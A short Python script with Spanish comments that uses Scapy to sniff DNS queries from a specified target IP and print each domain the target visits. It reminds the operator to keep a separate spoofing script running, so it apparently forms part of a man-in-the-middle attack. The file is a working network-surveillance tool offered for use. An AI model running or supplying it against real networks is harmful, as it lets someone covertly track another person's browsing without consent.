#!/usr/bin/env python3

import scapy.all as scapy
from termcolor import colored
import argparse
import sys

def get_arguments():
    arg = argparse.ArgumentParser(description="DNS Sniffer")
    arg.add_argument("-i", "--interface", required=True, dest="iface", help="Interfaz de red para snifear (ej: eth0, wlan0).")
    arg.add_argument("-t", "--target", required=True, dest="target_ip", help="IP del objetivo a monitorear.")
    return arg.parse_args()

def process_sniffed_packet(packet):
    # 1. Filtramos paquetes DNS de consulta
    if packet.haslayer(scapy.DNSQR):
        # 2. Confirmamos que la IP de origen sea la del objetivo
        if packet[scapy.IP].src == args.target_ip:
            # Capturamos el nombre de dominio (qname)
            query_name = packet[scapy.DNSQR].qname.decode()
            
            # Imprimimos la URL y la dirección IP de origen
            print(colored(f"[+] DNS Query capturada: Objetivo {args.target_ip} visitó -> {query_name}", 'magenta'))

            # Para análisis más profundo, podrías querer la respuesta (DNSRR)
            # if packet.haslayer(scapy.DNSRR):
            #     print(colored(f"    [>] Respuesta DNS: {packet[scapy.DNSRR].rdata}", 'blue'))

def start_sniffer(iface, target_ip):
    print(colored(f"[!] Iniciando Sniffer en {iface}. Monitoreando tráfico DNS de {target_ip}...", 'yellow'))
    print(colored("[!] Asegúrate de que el script de Spoofing esté corriendo en paralelo.", 'yellow'))
    
    # El filtro BPF (Berkeley Packet Filter) se aplica a la Capa 2
    # El filtro 'udp port 53' es estándar para DNS.
    # El filtro 'host TARGET_IP' asegura que el paquete sea del objetivo.
    # El filtro 'ip' asegura que el paquete tenga capa de red.
    bpf_filter = f"ip and udp port 53 and host {target_ip}"
    
    # La función sniff llama a process_sniffed_packet por cada paquete.
    scapy.sniff(iface=iface, store=False, filter=bpf_filter, prn=process_sniffed_packet)


if __name__ == '__main__':
    args = get_arguments()
    try:
        start_sniffer(args.iface, args.target_ip)
    except OSError as e:
        if 'No such device' in str(e):
            print(colored(f"[-] Error: Interfaz {args.iface} no encontrada.", 'red'))
        else:
            print(colored(f"[-] Error de permisos o interfaz: {e}", 'red'))
    except KeyboardInterrupt:
        print(colored("\n[!] Deteniendo Sniffer.", 'yellow'))
        sys.exit(0)
